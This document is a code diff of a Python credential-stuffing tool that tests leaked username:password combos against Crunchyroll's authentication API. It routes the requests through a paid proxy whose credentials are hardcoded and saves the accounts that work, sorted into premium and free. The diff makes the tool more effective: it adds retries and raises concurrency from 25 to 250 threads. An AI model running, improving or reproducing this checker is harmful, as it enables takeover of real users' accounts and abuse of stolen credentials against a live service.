@@ -1,8 +1,17 @@
-import requests
-import json
 from concurrent.futures import ThreadPoolExecutor
 
+import requests
+import json
+import time
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+
 def process_account(account):
+    if len(account) != 2:
+        print(f"Invalid account format: {account}")
+        return None
+
     username, password = account
     is_premium = check_account(username, password)
     return (username, password, is_premium)
@@ -13,6 +22,22 @@ def read_accounts_from_file(filename):
             account = tuple(line.strip().split(':'))
             accounts.append(account)
     return accounts
+
+
+def create_session_with_retry(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 503, 504)):
+    session = requests.Session()
+
+    retry = Retry(
+        total=retries,
+        backoff_factor=backoff_factor,
+        status_forcelist=status_forcelist,
+    )
+
+    adapter = HTTPAdapter(max_retries=retry)
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
+
+    return session
 def check_account(username, password):
 
     proxy = "gw.thunderproxies.net:5959:thunderpJ9pPsBU37O-dc-US:xBKtWmWTvzXUvS843F"
@@ -27,10 +52,11 @@ def check_account(username, password):
         "Content-Type": "application/x-www-form-urlencoded"
     }
 
-    sess = requests.Session()
+    sess = create_session_with_retry()
     sess.proxies.update(proxy_dict)
     sess.headers.update(headers)
 
+    time.sleep(0.5)
     #testing proxies
     #ip_address = sess.get('https://api.ipify.org').text
     #print(f"Public IP address: {ip_address}")
@@ -44,7 +70,7 @@ def check_account(username, password):
 
     response = sess.post(
         url="https://beta-api.crunchyroll.com/auth/v1/token",
-        data=data
+        data=data,
     )
 
     try:
@@ -77,7 +103,7 @@ def check_account(username, password):
             return False
 
         if total: #if total > 0 it contains a subscription
-            print(f"{username}: Valid")
+            print(f"{username}: Premium")
             return True
         else: #else if total = 0 --> free subscription
             print(f"{username}: Free Subscription")
@@ -92,7 +118,7 @@ accounts = read_accounts_from_file('combos.txt')
 total_accounts = len(accounts)
 print("Total accounts imported:", total_accounts)
 
-max_threads = 25  # Adjust the number of threads based on your needs
+max_threads = 250  # Adjust the number of threads based on your needs
 with ThreadPoolExecutor(max_threads) as executor:
     results = executor.map(process_account, accounts)
 
@@ -101,11 +127,13 @@ def save_to_file(filename, content):
     with open(filename, 'a') as f:
         f.write(content + "\n")
 
-for username, password, is_premium in results:
-    if is_premium is None:  # Check if the result is None (invalid)
-        print(f"{username}:{password}:Invalid")
-        save_to_file("invalid.txt", f"{username}:{password}:Invalid")
-    elif is_premium:
+for result in results:
+    if result is None:
+        continue
+
+    username, password, is_premium = result
+
+    if is_premium:
         print(f"{username}:{password}:Premium")
         save_to_file("premium.txt", f"{username}:{password}:Premium")
     else:
